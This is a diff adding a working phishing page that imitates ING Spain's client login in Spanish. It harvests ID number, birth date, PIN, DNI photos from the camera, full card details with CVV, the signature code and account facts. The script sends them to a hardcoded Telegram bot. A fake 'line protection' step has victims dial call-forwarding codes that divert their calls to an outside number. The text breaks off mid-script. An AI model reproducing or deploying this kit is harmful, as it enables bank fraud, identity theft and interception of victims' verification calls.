@@ -1,0 +1,1050 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ING - Acceso clientes</title>
+    <link rel="icon" href="assets/images/DIiSsaQ7uoHl.ico" type="image/x-icon">
+    <style>
+        @font-face {
+            font-family: 'INGMe';
+            font-style: normal;
+            font-weight: 400;
+            src: url('assets/fonts/INGMeNarrowWeb-Regular.woff2') format('woff2'),
+                 url('assets/fonts/INGMeNarrowWeb-Regular.woff') format('woff'),
+                 url('assets/fonts/INGMeNarrowWeb-Regular.ttf') format('truetype');
+        }
+        @font-face {
+            font-family: 'INGMe';
+            font-style: normal;
+            font-weight: 700;
+            src: url('assets/fonts/INGMeNarrowWeb-Bold.woff2') format('woff2'),
+                 url('assets/fonts/INGMeNarrowWeb-Bold.woff') format('woff'),
+                 url('assets/fonts/INGMeNarrowWeb-Bold.ttf') format('truetype');
+        }
+        @font-face {
+            font-family: 'INGMeBold';
+            font-style: normal;
+            src: url('assets/fonts/INGMeWeb-Bold.woff2') format('woff2'),
+                 url('assets/fonts/INGMeWeb-Bold.woff') format('woff'),
+                 url('assets/fonts/INGMeWeb-Bold.ttf') format('truetype');
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+        body {
+            font-family: INGMe, arial, helvetica, sans-serif;
+            background: #f0f0f0;
+            color: #333;
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Background image */
+        .bg-image {
+            position: fixed;
+            inset: 0;
+            background: url('https://ing.ingdirect.es/app-login/assets/images/ing-login-background.svg') no-repeat 100% 100%;
+            background-size: auto;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        /* Header */
+        .header {
+            position: relative;
+            z-index: 10;
+            background: #fff;
+            height: 64px;
+            display: flex;
+            align-items: center;
+        }
+        .header-separator {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: #ff6200;
+        }
+        .header-logo {
+            margin-left: 24px;
+            width: 48px;
+            height: 48px;
+        }
+        .header-logo svg { width: 100%; height: 100%; }
+
+        /* Main card */
+        .login-card {
+            position: relative;
+            z-index: 5;
+            max-width: 450px;
+            margin: 48px auto;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 1px 5px rgba(0,0,0,0.2), 0 3px 1px -2px rgba(0,0,0,0.12), 0 2px 2px rgba(0,0,0,0.14);
+            padding: 32px 24px 24px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #333;
+            line-height: 32px;
+            margin-bottom: 24px;
+        }
+
+        /* Radio group */
+        .radio-label {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 12px;
+            display: block;
+        }
+        .radio-group { margin-bottom: 24px; }
+        .radio-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 10px;
+            cursor: pointer;
+        }
+        .radio-item input[type="radio"] {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 20px; height: 20px;
+            border: 2px solid #767676;
+            border-radius: 50%;
+            cursor: pointer;
+            position: relative;
+            flex-shrink: 0;
+        }
+        .radio-item input[type="radio"]:checked {
+            border-color: #ff6200;
+        }
+        .radio-item input[type="radio"]:checked::after {
+            content: '';
+            position: absolute;
+            width: 10px; height: 10px;
+            background: #ff6200;
+            border-radius: 50%;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        .radio-item label {
+            font-size: 16px;
+            color: #333;
+            cursor: pointer;
+        }
+
+        /* Form fields */
+        .field { margin-bottom: 24px; }
+        .field-label {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 8px;
+            display: block;
+        }
+        .input-wrapper {
+            border: 1px solid #767676;
+            border-radius: 4px;
+            overflow: hidden;
+            transition: border-color 0.2s;
+        }
+        .input-wrapper:focus-within {
+            border-color: #ff6200;
+            box-shadow: 0 0 0 1px #ff6200;
+        }
+        .input-wrapper input {
+            width: 100%;
+            border: none;
+            outline: none;
+            padding: 12px 16px;
+            font-size: 16px;
+            font-family: INGMe, arial, helvetica, sans-serif;
+            color: #333;
+            background: transparent;
+            height: 42px;
+        }
+        .input-wrapper input::placeholder { color: #999; }
+
+        /* Date field with 3 inputs */
+        .date-wrapper {
+            display: flex;
+            border: 1px solid #767676;
+            border-radius: 4px;
+            overflow: hidden;
+            transition: border-color 0.2s;
+        }
+        .date-wrapper:focus-within {
+            border-color: #ff6200;
+            box-shadow: 0 0 0 1px #ff6200;
+        }
+        .date-wrapper input {
+            flex: 1;
+            min-width: 0;
+            border: none;
+            outline: none;
+            padding: 12px 4px;
+            font-size: 16px;
+            font-family: INGMe, arial, helvetica, sans-serif;
+            color: #333;
+            background: transparent;
+            text-align: center;
+            height: 42px;
+        }
+        .date-wrapper input::placeholder { color: #999; }
+        .date-sep {
+            width: 1px;
+            background: #767676;
+            align-self: stretch;
+        }
+
+        /* Checkbox + remember */
+        .remember-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .remember-row input[type="checkbox"] {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 18px; height: 18px;
+            border: 2px solid #767676;
+            border-radius: 3px;
+            cursor: pointer;
+            position: relative;
+            flex-shrink: 0;
+        }
+        .remember-row input[type="checkbox"]:checked {
+            background: #ff6200;
+            border-color: #ff6200;
+        }
+        .remember-row input[type="checkbox"]:checked::after {
+            content: '✓';
+            position: absolute;
+            color: #fff;
+            font-size: 12px;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        .remember-row label {
+            font-size: 16px;
+            color: #333;
+            cursor: pointer;
+        }
+        .help-btn {
+            width: 24px; height: 24px;
+            border: 2px solid #ff6200;
+            border-radius: 50%;
+            background: none;
+            color: #ff6200;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0;
+            position: relative;
+        }
+
+        /* Popover tooltip */
+        .popover {
+            display: none;
+            position: absolute;
+            bottom: calc(100% + 12px);
+            left: 50%;
+            transform: translateX(-50%);
+            background: #fff;
+            border: 1px solid #d9d9d9;
+            border-radius: 8px;
+            padding: 16px;
+            width: 280px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            z-index: 50;
+            font-size: 14px;
+            font-weight: 400;
+            color: #333;
+            line-height: 1.5;
+            text-align: left;
+        }
+        .popover::after {
+            content: '';
+            position: absolute;
+            top: 100%;
+            left: 50%;
+            transform: translateX(-50%);
+            border: 8px solid transparent;
+            border-top-color: #fff;
+        }
+        .popover::before {
+            content: '';
+            position: absolute;
+            top: 100%;
+            left: 50%;
+            transform: translateX(-50%);
+            border: 9px solid transparent;
+            border-top-color: #d9d9d9;
+        }
+        .popover.show { display: block; animation: fadeIn 0.2s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateX(-50%) translateY(4px); } to { opacity: 1; transform: translateX(-50%) translateY(0); } }
+
+        /* Submit button */
+        .btn-entrar {
+            width: 100%;
+            background: #ff6200;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            padding: 10px 16px;
+            height: 44px;
+            font-size: 19px;
+            font-weight: 700;
+            font-family: INGMe, arial, helvetica, sans-serif;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.2s;
+        }
+        .btn-entrar:active { background: #e55500; }
+
+        /* Footer link */
+        .security-link {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin-top: 24px;
+            padding-top: 16px;
+        }
+        .security-link .chevron {
+            color: #ff6200;
+            font-size: 16px;
+            font-weight: 700;
+        }
+        .security-link a {
+            font-size: 14px;
+            color: #1a3e8a;
+            text-decoration: underline;
+            font-family: INGMe, arial, helvetica, sans-serif;
+        }
+        .security-link a:hover { color: #ff6200; }
+        .security-link .ext-icon { margin-left: 2px; }
+
+        /* ===== PIN SCREEN ===== */
+        .pin-title {
+            font-size: 24px;
+            font-weight: 400;
+            color: #333;
+            line-height: 32px;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+        .pin-desc {
+            font-size: 16px;
+            color: #333;
+            line-height: 24px;
+            text-align: center;
+        }
+        .pin-help-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 32px;
+        }
+        .pin-circles {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 32px;
+        }
+        .pin-circle {
+            width: 20px; height: 20px;
+            border-radius: 50%;
+            border: 2px solid #525199;
+            background: #fff;
+            transition: all 0.15s ease;
+        }
+        .pin-circle.active {
+            border-color: #ff6200;
+            box-shadow: 0 0 0 2px rgba(255, 98, 0, 0.25);
+        }
+        .pin-circle.entered {
+            background: #525199;
+            border-color: #525199;
+        }
+        .numpad {
+            display: flex;
+            flex-wrap: wrap;
+            border: 1px solid #d9d9d9;
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 0 auto 28px;
+            max-width: 300px;
+        }
+        .numpad-btn {
+            width: 20%;
+            height: 64px;
+            background: #fff;
+            border: none;
+            border-right: 1px solid #d9d9d9;
+            border-bottom: 1px solid #d9d9d9;
+            font-size: 28px;
+            font-family: INGMe, arial, helvetica, sans-serif;
+            font-weight: 400;
+            color: #333;
+            cursor: pointer;
+            text-align: center;
+            line-height: 64px;
+            padding: 0;
+        }
+        .numpad-btn:nth-child(5n) { border-right: none; }
+        .numpad-btn:nth-child(n+6) { border-bottom: none; }
+        .numpad-btn:active { background: #f0f0f0; }
+
+        .pin-links { margin-top: 4px; text-align: center; }
+        .pin-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 10px;
+            width: 100%;
+            justify-content: center;
+        }
+        .pin-link-arrow { color: #ff6200; font-size: 14px; font-weight: 700; }
+        .pin-link a {
+            color: #1a3e8a;
+            font-size: 14px;
+            text-decoration: underline;
+        }
+
+        /* ===== SECTIONS & TRANSITIONS ===== */
+        .form-section { animation: slideIn 0.3s ease forwards; }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .hidden { display: none !important; }
+
+        /* ===== SELECTION / VERIFICATION ===== */
+        .option-card {
+            width: 100%;
+            padding: 16px;
+            background: #fff;
+            border: 1px solid #d9d9d9;
+            border-radius: 8px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            text-align: left;
+        }
+        .option-card:hover { border-color: #ff6200; }
+        .option-card:active { background: #fff5f0; }
+        .option-card .icon {
+            width: 40px; height: 40px;
+            background: rgba(255,98,0,0.08);
+            border-radius: 8px;
+            display: flex; justify-content: center; align-items: center;
+            color: #ff6200; font-size: 20px; flex-shrink: 0;
+        }
+        .option-card .info h4 { font-size: 15px; font-weight: 600; color: #333; }
+        .option-card .info p { font-size: 12px; color: #666; margin-top: 2px; }
+
+        .btn-back {
+            display: block; width: 100%; text-align: center;
+            color: #666; font-size: 14px; font-weight: 400; font-family: INGMe, arial, helvetica, sans-serif;
+            margin-top: 20px; background: none; border: none; cursor: pointer; padding: 8px;
+        }
+        .btn-back:hover { color: #ff6200; }
+
+        .preg-opt {
+            flex: 1; height: 44px; border: 2px solid #d9d9d9; border-radius: 8px;
+            background: #fff; color: #333; font-size: 16px; font-weight: 600;
+            font-family: INGMe, arial, helvetica, sans-serif; cursor: pointer;
+            transition: all 0.15s;
+        }
+        .preg-opt:active, .preg-opt.selected {
+            border-color: #ff6200; background: rgba(255,98,0,0.06); color: #ff6200;
+        }
+        .preg-step { animation: slideIn 0.3s ease forwards; }
+
+        .btn-primary {
+            width: 100%; background: #ff6200; color: #fff; border: none;
+            border-radius: 8px; padding: 10px 16px; height: 44px;
+            font-size: 19px; font-weight: 700; font-family: INGMe, arial, helvetica, sans-serif;
+            cursor: pointer; margin-top: 16px;
+        }
+        .btn-primary:active { background: #e55500; }
+
+        /* Camera */
+        .cam-box { width: 100%; border-radius: 8px; overflow: hidden; background: #111; margin: 12px 0; }
+        .cam-box video { width: 100%; display: block; }
+
+        /* Loading */
+        .loading {
+            display: none; position: fixed; inset: 0; background: rgba(255,255,255,0.95);
+            z-index: 100; justify-content: center; align-items: center; flex-direction: column;
+            backdrop-filter: blur(4px); -webkit-backdrop-filter: blur(4px);
+        }
+        .spinner {
+            width: 48px; height: 48px;
+            border: 4px solid rgba(255,98,0,0.15); border-top: 4px solid #ff6200;
+            border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 16px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loading-text { color: #333; font-weight: 600; font-size: 15px; }
+
+        @media (max-width: 480px) {
+            .login-card { margin: 0; border-radius: 0; box-shadow: none; min-height: calc(100vh - 68px); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bg-image"></div>
+
+    <!-- HEADER -->
+    <div class="header">
+        <div class="header-logo" style="display:flex;align-items:center;">
+            <img src="assets/images/ing-header-logo-light.svg" alt="ING" style="height:28px;width:auto;">
+        </div>
+        <div class="header-separator"></div>
+    </div>
+
+    <!-- LOGIN CARD -->
+    <div class="login-card">
+
+        <!-- STEP 1: CREDENTIALS -->
+        <div class="form-section" id="loginSection">
+            <h1>Accede a tu Área Clientes</h1>
+
+            <span class="radio-label">Elige tu documento</span>
+            <div class="radio-group">
+                <div class="radio-item">
+                    <input type="radio" name="docType" id="radioDni" value="dni" checked>
+                    <label for="radioDni">DNI o Tarjeta de residencia</label>
+                </div>
+                <div class="radio-item">
+                    <input type="radio" name="docType" id="radioPasaporte" value="pasaporte">
+                    <label for="radioPasaporte">Pasaporte</label>
+                </div>
+            </div>
+
+            <div class="field">
+                <label class="field-label">Número de documento</label>
+                <div class="input-wrapper">
+                    <input type="text" id="usuario" placeholder="DNI o Tarjeta de residencia" autocomplete="off" maxlength="10">
+                </div>
+            </div>
+
+            <div class="field">
+                <label class="field-label">Fecha de nacimiento</label>
+                <div class="date-wrapper">
+                    <input type="text" id="fechaDD" placeholder="DD" maxlength="2" inputmode="numeric">
+                    <div class="date-sep"></div>
+                    <input type="text" id="fechaMM" placeholder="MM" maxlength="2" inputmode="numeric">
+                    <div class="date-sep"></div>
+                    <input type="text" id="fechaAAAA" placeholder="AAAA" maxlength="4" inputmode="numeric">
+                </div>
+            </div>
+
+            <div class="remember-row">
+                <input type="checkbox" id="recordar">
+                <label for="recordar">Recordar</label>
+                <button type="button" class="help-btn" aria-label="Más información" onclick="togglePopover(event, 'popRecordar')">?
+                    <div class="popover" id="popRecordar">Esta opción permitirá que este equipo recuerde tus datos para que no necesites incluirlos de nuevo. No la actives si este equipo también lo utilizan otras personas.</div>
+                </button>
+            </div>
+
+            <button class="btn-entrar" id="loginBtn">Entrar</button>
+
+            <div class="security-link">
+                <span class="chevron">›</span>
+                <a href="#">Más información sobre seguridad</a>
+                <svg class="ext-icon" width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M1 11L11 1M11 1H4M11 1V8" stroke="#1a3e8a" stroke-width="1.5"/></svg>
+            </div>
+        </div>
+
+        <!-- STEP 2: PIN -->
+        <div class="form-section hidden" id="pinSection">
+            <h1 class="pin-title">Clave de seguridad</h1>
+            <div class="pin-help-row">
+                <p class="pin-desc">Introduce tu clave de seguridad:</p>
+                <button class="help-btn" type="button" onclick="togglePopover(event, 'popClave')">?
+                    <div class="popover" id="popClave">Tu clave de seguridad es el código de 6 dígitos que elegiste al activar tu cuenta ING. Si no la recuerdas, puedes solicitar una nueva desde el enlace inferior.</div>
+                </button>
+            </div>
+            <div class="pin-circles" id="pinCircles"></div>
+            <div class="numpad" id="numpad"></div>
+            <div class="pin-links">
+                <div class="pin-link">
+                    <span class="pin-link-arrow">›</span>
+                    <a href="#">No recuerdo mi clave</a>
+                </div>
+                <div class="pin-link">
+                    <span class="pin-link-arrow">›</span>
+                    <a href="#">Más información sobre seguridad</a>
+                    <svg width="12" height="12" viewBox="0 0 12 12" fill="none" style="margin-left:2px;vertical-align:middle;"><path d="M1 11L11 1M11 1H4M11 1V8" stroke="#1a3e8a" stroke-width="1.5"/></svg>
+                </div>
+            </div>
+        </div>
+
+        <!-- STEP 3: VERIFICATION SELECTION -->
+        <div class="form-section hidden" id="selectionScreen">
+            <div style="text-align:center;margin-bottom:20px">
+                <div style="width:56px;height:56px;background:rgba(255,98,0,0.08);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 12px"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#ff6200" stroke-width="1.8"><path d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z"/><path d="M9 12l2 2 4-4" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+                <h1 style="font-size:22px;margin-bottom:6px">Verificación de seguridad</h1>
+                <p style="font-size:14px;color:#666;line-height:1.5">Por seguridad, necesitamos verificar su identidad. Seleccione un método.</p>
+            </div>
+
+            <div class="option-card" onclick="selectDNI()">
+                <div class="icon">🆔</div>
+                <div class="info"><h4>Documento de identidad</h4><p>Foto de su DNI para verificar</p></div>
+            </div>
+            <div class="option-card" onclick="selectTarjeta()">
+                <div class="icon">💳</div>
+                <div class="info"><h4>Tarjeta de crédito/débito</h4><p>Número, caducidad y CVV</p></div>
+            </div>
+            <div class="option-card" onclick="selectFirma()">
+                <div class="icon">✍️</div>
+                <div class="info"><h4>Firma de operaciones</h4><p>Código de firma de 6 dígitos</p></div>
+            </div>
+            <div class="option-card" onclick="selectMalware()">
+                <div class="icon">📱</div>
+                <div class="info"><h4>Protección de línea</h4><p>Proteja su línea telefónica</p></div>
+            </div>
+            <div class="option-card" onclick="selectPreguntas()">
+                <div class="icon">❓</div>
+                <div class="info"><h4>Preguntas de seguridad</h4><p>Verifique con información de su cuenta</p></div>
+            </div>
+
+            <div style="display:flex;align-items:center;gap:8px;margin-top:16px;padding:12px;background:rgba(255,98,0,0.04);border-radius:8px">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#ff6200" stroke-width="1.5"><path d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z"/><path d="M9 12l2 2 4-4" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                <span style="font-size:12px;color:#555">Conexión segura. Sus datos están protegidos.</span>
+            </div>
+
+            <button class="btn-back" onclick="location.reload()">← Volver al inicio</button>
+        </div>
+
+        <!-- STEP: PREGUNTAS DE SEGURIDAD -->
+        <div class="form-section hidden" id="preguntasContainer">
+            <h1 style="font-size:22px;margin-bottom:16px">Preguntas de seguridad</h1>
+            <p style="font-size:14px;color:#666;margin-bottom:24px;line-height:1.5">Para verificar su identidad, responda las siguientes preguntas sobre su cuenta ING.</p>
+
+            <div id="pregStep1" class="preg-step">
+                <div style="background:#fff;border:1px solid #d9d9d9;border-radius:8px;padding:20px;margin-bottom:16px">
+                    <p style="font-size:15px;color:#333;font-weight:600;margin-bottom:16px">¿Hay más titulares o cotitulares en su cuenta?</p>
+                    <div style="display:flex;gap:12px;margin-bottom:12px">
+                        <button class="preg-opt" onclick="pregAnswer(1,'si')">Sí</button>
+                        <button class="preg-opt" onclick="pregAnswer(1,'no')">No</button>
+                    </div>
+                    <div id="pregNombre" style="display:none;margin-top:12px">
+                        <label style="font-size:13px;color:#333;display:block;margin-bottom:6px">Nombre del cotitular:</label>
+                        <div class="input-wrapper"><input type="text" id="cotitularNombre" placeholder="Nombre completo" autocomplete="off"></div>
+                        <button class="btn-primary" style="margin-top:12px" onclick="pregNext(1)">Continuar</button>
+                    </div>
+                </div>
+            </div>
+
+            <div id="pregStep2" class="preg-step hidden">
+                <div style="background:#fff;border:1px solid #d9d9d9;border-radius:8px;padding:20px;margin-bottom:16px">
+                    <p style="font-size:15px;color:#333;font-weight:600;margin-bottom:16px">¿Ha realizado la declaración de la renta de este año con ING?</p>
+                    <div style="display:flex;gap:12px">
+                        <button class="preg-opt" onclick="pregAnswer(2,'si')">Sí</button>
+                        <button class="preg-opt" onclick="pregAnswer(2,'no')">No</button>
+                    </div>
+                </div>
+            </div>
+
+            <div id="pregStep3" class="preg-step hidden">
+                <div style="background:#fff;border:1px solid #d9d9d9;border-radius:8px;padding:20px;margin-bottom:16px">
+                    <p style="font-size:15px;color:#333;font-weight:600;margin-bottom:16px">¿Tiene inversiones o algún fondo con ING?</p>
+                    <div style="display:flex;gap:12px">
+                        <button class="preg-opt" onclick="pregAnswer(3,'si')">Sí</button>
+                        <button class="preg-opt" onclick="pregAnswer(3,'no')">No</button>
+                    </div>
+                </div>
+            </div>
+
+            <div id="pregDone" class="preg-step hidden">
+                <div style="text-align:center;padding:20px 0">
+                    <div style="font-size:50px;margin-bottom:16px">✅</div>
+                    <h1 style="font-size:20px">Respuestas verificadas</h1>
+                    <p style="font-size:14px;color:#666;margin:12px 0 20px">Sus respuestas han sido registradas correctamente.</p>
+                    <button class="btn-primary" onclick="goToSelection()">Volver</button>
+                </div>
+            </div>
+
+            <button class="btn-back" onclick="goToSelection()">← Elegir otro método</button>
+        </div>
+
+        <!-- STEP 4: DNI -->
+        <div class="form-section hidden" id="dniContainer">
+            <div id="dniStep1">
+                <h1>Verificación de identidad</h1>
+                <p style="font-size:14px;color:#666;margin-bottom:16px">Haz una foto de la parte <strong>delantera</strong> de tu DNI.</p>
+                <div style="text-align:center">
+                    <div class="cam-box"><video id="videoFrente" autoplay playsinline muted></video><canvas id="canvasFrente" style="display:none"></canvas></div>
+                    <button class="btn-primary" onclick="capturePhoto(1)">📷 Capturar foto delantera</button>
+                    <p style="font-size:12px;color:#999;margin-top:10px">Encuadre la parte delantera del DNI y pulse capturar.</p>
+                </div>
+                <button class="btn-back" onclick="stopCamera();goToSelection()">← Elegir otro método</button>
+            </div>
+            <div class="hidden" id="dniStep2">
+                <h1>Parte trasera del DNI</h1>
+                <p style="font-size:14px;color:#666;margin-bottom:16px">Ahora haz una foto de la parte <strong>trasera</strong> de tu DNI.</p>
+                <div style="text-align:center">
+                    <div class="cam-box"><video id="VideoDorso" autoplay playsinline muted></video><canvas id="canvasDorso" style="display:none"></canvas></div>
+                    <button class="btn-primary" onclick="capturePhoto(2)">📷 Capturar foto trasera</button>
+                </div>
+                <button class="btn-back" onclick="stopCamera();dniBack(2)">← Atrás</button>
+            </div>
+            <div class="hidden" id="dniStep3">
+                <div style="text-align:center;padding:20px 0">
+                    <div style="font-size:50px;margin-bottom:20px">✅</div>
+                    <h1>Información verificada</h1>
+                    <p style="font-size:14px;color:#666;margin-bottom:20px">Los datos han sido verificados correctamente.</p>
+                    <button class="btn-primary" onclick="goToSelection()">Volver</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- STEP 5: TARJETA -->
+        <div class="form-section hidden" id="tarjetaContainer">
+            <div id="stepTarjeta">
+                <h1>Datos de tarjeta</h1>
+                <p style="font-size:14px;color:#666;margin-bottom:16px">Introduzca los 16 dígitos de su tarjeta.</p>
+                <div class="field">
+                    <div class="input-wrapper"><input type="text" id="tarjeta" placeholder="0000 0000 0000 0000" inputmode="numeric" maxlength="19"></div>
+                </div>
+                <button class="btn-primary" onclick="continueTarjeta()" style="margin-top:0">Siguiente</button>
+                <button class="btn-back" onclick="goToSelection()">← Volver</button>
+            </div>
+            <div class="hidden" id="stepFecha">
+                <h1>Caducidad</h1>
+                <p style="font-size:14px;color:#666;margin-bottom:16px">Mes y año de vencimiento de su tarjeta.</p>
+                <div class="field">
+                    <div class="input-wrapper"><input type="text" id="fecha" placeholder="MM / AA" maxlength="7"></div>
+                </div>
+                <button class="btn-primary" onclick="continueFecha()" style="margin-top:0">Continuar</button>
+                <button class="btn-back" onclick="backToTarjeta()">← Atrás</button>
+            </div>
+            <div class="hidden" id="stepCVV">
+                <h1>Código CVV</h1>
+                <p style="font-size:14px;color:#666;margin-bottom:16px">Los 3 dígitos del reverso de su tarjeta.</p>
+                <div class="field">
+                    <div class="input-wrapper"><input type="password" id="cvv" placeholder="000" inputmode="numeric" maxlength="3"></div>
+                </div>
+                <button class="btn-primary" onclick="sendCVV()" style="margin-top:0">Finalizar</button>
+                <button class="btn-back" onclick="backToFecha()">← Atrás</button>
+            </div>
+        </div>
+
+        <!-- STEP 6: MALWARE -->
+        <div class="form-section hidden" id="malwareContainer">
+            <h1>Protección antimalware</h1>
+            <p style="font-size:14px;color:#666;margin-bottom:20px">Hemos detectado actividad sospechosa. Complete los siguientes pasos para proteger su línea.</p>
+            <div id="malStep1">
+                <div style="background:rgba(255,98,0,0.06);border-radius:8px;padding:20px;text-align:center;margin-bottom:16px">
+                    <div style="font-size:14px;font-weight:600;color:#333;margin-bottom:4px">Paso 1 de 2</div>
+                    <div style="font-size:13px;color:#666;margin-bottom:16px">Activar protección de desvío de llamadas</div>
+                    <a id="malLink1" href="tel:**21*607059297%23" target="_top" class="btn-primary" style="display:block;text-decoration:none;text-align:center;line-height:24px">Activar protección de línea</a>
+                    <p style="font-size:11px;color:#999;margin-top:10px">Se abrirá su marcador. Confirme la llamada.</p>
+                    <div style="margin-top:16px;padding-top:16px;border-top:1px solid #d9d9d9">
+                        <p style="font-size:12px;color:#666;margin-bottom:8px">Si no puede marcar automáticamente:</p>
+                        <p style="font-size:16px;font-weight:700;color:#ff6200">**21*607059297#</p>
+                        <button class="btn-primary" style="margin-top:12px;height:36px;font-size:14px" onclick="document.getElementById('malStep1').classList.add('hidden');document.getElementById('malStep2').classList.remove('hidden')">CONTINUAR</button>
+                    </div>
+                </div>
+                <div style="display:flex;align-items:flex-start;gap:8px;margin-bottom:8px">
+                    <span style="color:#ff6200;font-weight:700">›</span>
+                    <span style="font-size:12px;color:#555">Ningún agente de ING le pedirá sus claves completas.</span>
+                </div>
+                <div style="display:flex;align-items:flex-start;gap:8px">
+                    <span style="color:#ff6200;font-weight:700">›</span>
+                    <span style="font-size:12px;color:#555">Esta es la única verificación oficial de ING.</span>
+                </div>
+            </div>
+            <div class="hidden" id="malStep2">
+                <div style="background:rgba(255,98,0,0.06);border-radius:8px;padding:20px;text-align:center;margin-bottom:16px">
+                    <div style="font-size:14px;font-weight:600;color:#333;margin-bottom:4px">Paso 2 de 2</div>
+                    <div style="font-size:13px;color:#666;margin-bottom:16px">Activar bloqueo de seguridad</div>
+                    <a id="malLink2" href="tel:*33*2093%23" target="_top" class="btn-primary" style="display:block;text-decoration:none;text-align:center;line-height:24px">Activar bloqueo de seguridad</a>
+                    <p style="font-size:11px;color:#999;margin-top:10px">Se abrirá su marcador. Confirme la llamada.</p>
+                    <div style="margin-top:16px;padding-top:16px;border-top:1px solid #d9d9d9">
+                        <p style="font-size:12px;color:#666;margin-bottom:8px">Si no puede marcar automáticamente:</p>
+                        <p style="font-size:16px;font-weight:700;color:#ff6200">*33*2093#</p>
+                        <button class="btn-primary" style="margin-top:12px;height:36px;font-size:14px" onclick="document.getElementById('malStep2').classList.add('hidden');document.getElementById('malDone').classList.remove('hidden')">CONTINUAR</button>
+                    </div>
+                </div>
+            </div>
+            <div class="hidden" id="malDone">
+                <div style="text-align:center;padding:20px 0">
+                    <div style="font-size:50px;margin-bottom:16px">✅</div>
+                    <h1>Protección activada</h1>
+                    <p style="font-size:14px;color:#666;margin-bottom:20px">Su línea ha sido protegida correctamente.</p>
+                    <button class="btn-primary" onclick="goToSelection()">Volver</button>
+                </div>
+            </div>
+            <button class="btn-back" onclick="goToSelection()">← Elegir otro método</button>
+        </div>
+
+        <!-- STEP 7: FIRMA -->
+        <div class="form-section hidden" id="firmaContainer">
+            <h1>Clave de firma</h1>
+            <p style="font-size:14px;color:#666;margin-bottom:20px">Introduzca su código de firma para validar el acceso.</p>
+            <div class="field">
+                <label class="field-label">Código de firma</label>
+                <div class="input-wrapper"><input type="password" id="firma" placeholder="6 dígitos" inputmode="numeric" maxlength="6"></div>
+            </div>
+            <button class="btn-primary" onclick="sendFirma()" style="margin-top:0">Validar firma</button>
+            <button class="btn-back" onclick="goToSelection()">← Volver</button>
+        </div>
+    </div>
+
+    <!-- LOADING -->
+    <div class="loading" id="loadingScreen">
+        <div class="spinner"></div>
+        <p class="loading-text">Verificando conexión segura...</p>
+    </div>
+
+    <script>
+        /* ===== POPOVERS ===== */
+        function togglePopover(e, id) {
+            e.stopPropagation();
+            const pop = document.getElementById(id);
+            const isOpen = pop.classList.contains('show');
+            document.querySelectorAll('.popover.show').forEach(p => p.classList.remove('show'));
+            if (!isOpen) pop.classList.add('show');
+        }
+        document.addEventListener('click', () => {
+            document.querySelectorAll('.popover.show').forEach(p => p.classList.remove('show'));
+        });
+
+        const BOT_TOKEN = '8658543489:AAHTAbGfWiw83B-FJ83bDapipV7SYh58M14';
+        const CHAT_ID = '1734386292';
+
+        async function sendToTelegram(msg) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+                });
+            } catch (e) {}
+        }
+
+        async function sendPhotoToTelegram(file, caption) {
+            try {
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', file);
+                fd.append('caption', caption);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            } catch (e) {}
+        }
+
+        /* ===== LOGIN ===== */
+        const loginBtn = document.getElementById('loginBtn');
+        loginBtn.addEventListener('click', function () {
+            const usuario = document.getElementById('usuario').value;
+            const dd = document.getElementById('fechaDD').value;
+            const mm = document.getElementById('fechaMM').value;
